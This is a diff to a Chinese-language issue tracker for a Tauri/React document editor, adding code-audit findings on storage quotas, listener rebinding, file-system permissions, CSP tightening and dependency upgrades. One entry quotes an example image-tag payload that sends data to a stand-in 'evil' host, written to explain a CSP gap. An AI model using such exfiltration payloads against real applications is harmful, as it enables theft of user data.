@@ -30,7 +30,56 @@
 
 ## 待处理
 
-> **2026-08-14 核实清理**：原「待处理」区 ISS-087 / ISS-132 / ISS-133~140 经代码核实均已落地或撤销，移入下方归档区。当前无待处理任务。
+> **2026-08-27 代码审计新增**：全仓排查（Rust 命令 / capabilities / CSP / 服务层 / React hooks / 构建配置 / 依赖版本）产出以下条目。两个高危缺陷已直接 PR 修复：ISS-196（#133，图片资产跨 tab 数据丢失）、ISS-197（#135，fs 插件 ACL 补位 + write_managed_asset 强制约束）。
+
+### 缺陷类
+
+#### ⬜ ISS-198 sessionStore 持久化无预算控制 → localStorage 配额静默失效
+
+- **发现:** `src/services/sessionStore.ts` 只对 `content > 256KB` 做降级清空；`docxHtml`（中型 docx 转出的 HTML 可达数百 KB~数 MB）与 `lastSavedContent` 不设限双份存储。每次 800ms 防抖 `JSON.stringify(session)` 触发 QuotaExceededError 后被 catch 静默吞掉。
+- **影响:** 打开中等体积 docx 或积累多个大文档后，所有 tab 的草稿恢复 / 最近文件无声失效，用户无感知直到丢内容。
+- **建议:** toPersisted 对 `docxHtml` 一律剥离（重启可重转）；超预算时从最大 tab 起剥 content；失败时发诊断事件提示。另评估「打开 docx 即将其挂为只读预览」的产品口径。
+
+#### ⬜ ISS-199 useSession 跨窗口事件监听按每键重绑
+
+- **发现:** `src/hooks/useSession.ts` 监听 effect 以 `[state.tabs]` 为依赖——打字每键都触发 cleanup/unlisten + 动态 import + 重新 listen，监听空窗期可能错过 `window:closed` / `tab:merge-back` 事件。同模式散布于 AppLayout 键盘快捷键 effect（依赖含每键重建的 handleSave 等）。
+- **影响:** tear-off 场景偶发丢回收事件；无谓的绑定开销。
+- **建议:** 监听器内经 ref 读最新 state（`stateRef` 已存在），effect 依赖收敛为 `[]` / 稳定项。
+
+#### ⬜ ISS-200 关窗确认流 closing 守卫可被重绑击穿 + 通用 IO 错误用户零反馈
+
+- **发现:** (1) `AppLayout.tsx` 关窗确认流的 `let closing = false` 是 effect 局部变量、deps 含 tabs——dirty 弹窗期间 autosave 改变 tabs 触发重绑后可并发进入第二条关闭流，孤儿 promise；(2) `handleOpenPath` / 快捷键调用 async handler 无 catch、fileService 仅对 oversized/denied-path 两类弹提示，文件被移走 / 编码异常 / 磁盘满等全部 unhandled rejection。
+- **建议:** closing 提升为 ref 级标志；handleOpenPath/handleSave 包统一 toast / 原生 message 兜底。
+
+### 收口 / 演进类
+
+#### ⬜ ISS-201 fs 插件彻底收口：持久 IO 全部走自定义命令
+
+- **背景:** ISS-197（PR #135）以 deny-only scope 补位，但插件面仍保留 `fs:allow-read/write-*`。「allow 空 = 放行一切」的根因在 ACL 模型本身，敏感目录之外的任意路径读写依旧不受约束。
+- **路径:** fileService（`saveFileAs` 二次写入）、wordExportService（writeFile）、wechatPreviewService（writeTextFile/save+readTextFile）、htmlPresentationService（readLocalResource）四处调用面改走受控 Rust 命令（扩展名白名单 + 黑名单复用），然后从 capabilities 删除 4 条 fs allow-*。
+- **注意:** 迁移前后须真机回归全部涉盘流程（NOT_VERIFIED 清单见 CHANGELOG ISS-197 条目）。
+
+#### ⬜ ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛
+
+- **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
+- **建议:** 排查 Vditor/KaTeX/Mermaid 对 eval 的真实依赖逐项灰度摘除；保留并测试锚定 `connect-src 'self'`。
+
+#### ⬜ ISS-203 TypeScript strict 迁移
+
+- **发现:** `config/tsconfig.app.json` 与 `tsconfig.node.json` 均未开启 `strict`（`noImplicitAny` / `strictNullChecks` 缺省关闭），对以字符串管道为主的项目事故面偏大。
+- **建议:** 分两步：先开 `strictNullChecks` 修完编译错，再补齐其余 strict 开关；CI typecheck 已是门槛，一次性收益明显。
+
+#### ⬜ ISS-204 依赖升级批次（低风险小版本）
+
+- **清单:** vite 8.1→8.2、vitest 4.1.6→4.1.11、@playwright/test & playwright 1.60→1.62、typescript-eslint 8.65→8.68、globals/eslint minor、@tauri-apps/api 2.11.0→2.11.1、vditor 3.11.2→3.11.3、dompurify 3.4.3→3.4.14、docx 9.6.1→9.7.1、mammoth 1.12.1、vitejs/plugin-react 6.1.0。
+- **单列评估:** typescript 6.0→7.0（跨主版本）；jsdom 29→30（vitest 环境兼容性）；lucide-react 1.16→1.34（图标库跨度大，查 breaking）。
+- **备注:** `npm audit` 当前无法运行（node_modules 状态致 npm 自身报 `Cannot read properties of null (reading 'edgesOut')`），跑一次 `rm -rf node_modules && npm ci` 后再审计。
+
+### 已接受的风险（不追踪）
+
+- `licenseService.ts` 内测授权码硬编码于随发行版分发的 JS bundle（`YWXLAW` 明文可提取、license state 可离线伪造）。本地内测场景下接受的权衡；若未来商业化需换签名码（public key 校验）。
+
+---
 
 ### 已归档完成项（ISS-087 撤销 / ISS-132~140 核实归档，2026-08-14）
 
